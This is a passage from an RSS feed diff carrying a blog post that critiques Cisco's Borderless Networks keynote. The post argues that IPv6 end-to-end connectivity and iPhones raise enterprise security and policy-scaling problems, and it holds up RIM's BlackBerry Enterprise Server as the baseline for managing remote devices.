+fact are recommended for use in both networks. The problem becomes the
+scale that is needed to protect and defend a network that has complete
+end-to-end connectivity. Once again, going back to the &lt;strong&gt;after&lt;/strong&gt;
+diagram, only taking into account remote device access, the number of
+policies that needs to be maintained, protected, and monitored goes from
+1 to 4. Now a growth of 400% is big, but almost manageable. If you start
+to think about a small enterprise with 20 offices, 2 datacenters, and
+200 remote users, the problem of scale is instantly untenable.&lt;/p&gt;
+
+&lt;p&gt;IPv6 will solve a lot of problems for networks as the need for NAT
+will go away and devices will be able to directly address each other
+across networks and boundaries, but as with just about everything there
+are side effects. Keeping control of access into and out your network
+is the first line of defense and with IPv6 this becomes a policy and
+enforcement issue even if it is no longer a technical requirement.&lt;/p&gt;
+
+&lt;h4 id=&#34;the-iphone-key-to-the-borderless-network:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;The iPhone, Key to the Borderless Network&lt;/h4&gt;
+
+&lt;p&gt;Joel said he likes his iPhone and from the huge number of videos from Cisco featuring an iPhone it&amp;rsquo;s safe to assume Cisco does too.  During the keynote Joel pointed out the iPhone a few times in a number examples and in general with heavy praise.  Joel and I agree the iPhone is an amazing device, an important step forward in mobile computing.  After this Joel and I begin to disagree, namely around one key point: &amp;ldquo;&lt;em&gt;The iPhone is a game changer.&lt;/em&gt;&amp;rdquo;  I think that statement needs to add &amp;ldquo;&lt;em&gt;for the consumer market&lt;/em&gt;&amp;rdquo;.&lt;/p&gt;
+
+&lt;div class=&#34;wp-caption&#34; style=&#34;float: left;margin: 5px;margin-left: 5px;margin-right: 21px;&#34;&gt;&lt;a title=&#34;Figure 3: The iPhone&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34;&gt;&lt;img src=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34; border=&#34;1&#34; alt=&#34;Us vs Them&#34; width=&#34;200&#34; height=&#34;330&#34; /&gt; &lt;/a&gt;
+&lt;p class=&#34;wp-caption-text&#34;&gt;&lt;a title=&#34;Figure 3: The iPhone&#34; rel=&#34;lightbox&#34; href=&#34;https://jeremyrossi.com/img/iphone_home.gif&#34;&gt;Figure 3: The iPhone&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
+
+&lt;p&gt;iPhones are enabling users to use the Internet from
+almost anyplace; it&amp;rsquo;s one of the most popular cameras on
+&lt;a href=&#34;http://www.flickr.com/cameras/&#34;&gt;flickr&lt;/a&gt;, has a huge list of
+applications, and, for some people, a complete replacement for
+the traditional computer. While its strong points work well
+in the consumer market, in the enterprise markets it&amp;rsquo;s a very
+different beast. In fact the strongest points for the iPhone in
+the consumer market are security concerns for the enterprise.
+Application controls are limited, centralized control is even more
+limited, and encryption of the data residing on the devices is a
+&lt;a href=&#34;http://www.wired.com/gadgetlab/2009/07/iphone-encryption/&#34;&gt;problem&lt;/a&gt; on
+the most fully featured phone to date.&lt;/p&gt;
+
+&lt;p&gt;Devices like the iPhone should be thought of less as a phone and more as
+a laptop. With that comes all the same protections and controls that we
+use to mitigate risk on an enterprise laptop. Here is a quick list of
+what I expect from a laptop and by extension from an iPhone for it to
+become a viable remote access device in the enterprise environment:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Virus and Malware software with centralized reporting&lt;/li&gt;
+&lt;li&gt;Secure communications for the device; both internal resources and the ability to define policies&lt;/li&gt;
+&lt;li&gt;Strong Data Encryption on the device&lt;/li&gt;
+&lt;li&gt;Ability to do remote kill of device&lt;/li&gt;
+&lt;li&gt;Application installation and run controls&lt;/li&gt;
+&lt;li&gt;Web Filter/Proxy controls&lt;/li&gt;
+&lt;li&gt;Access controls, password complexity settings and password failure data destruction&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Some of the areas listed are available on the iPhone, but none of them are near complete and ready for everyday use in an enterprise.  &lt;a href=&#34;http://www.rim.com/&#34;&gt;Research In Motion&lt;/a&gt; (RIM) dominates the enterprise market for the reasons I have listed here.  RIM via the BlackBerry Enterprise Server (BES) gives the enterprise complete control of every device that connects via a centralized management station.  BES also does network traffic correctly in that all devices came back to the BES at a single point of entry into the enterprise.  This allows an enterprise to place additional control directly attached to the BES and not with multiple devices all over the network.  RIM&amp;rsquo;s BES product represents the minimum level of security that should be expected for remote access of phone like devices. I would go so far as to say it should be the starting standard for how remote access devices should behave.&lt;/p&gt;
+
+&lt;p&gt;The iPhone might be the start of things to come, but in no way is it even close to ready for the enterprise market.&lt;/p&gt;
+
+&lt;h2 id=&#34;why:8d02665b80542cba38ee5fc1864ae0c3&#34;&gt;Why?&lt;/h2&gt;
+
+&lt;p&gt;Cisco&amp;rsquo;s push with Borderless Networks is either something that they haven&amp;rsquo;t completely vetted from a security perspective or the security strategy isn&amp;rsquo;t completely explained in the marketing.  The huge increase in the number of points needing protection, the corresponding increase in the policy and management, and management data flow and access controls are areas that need addressing.  These are problems we still having troubles controlling with our current network deployments.  Unless Cisco has a magic bullet coming out of their research and development departments, I don&amp;rsquo;t see how this move to Borderless Networks is even possible.&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
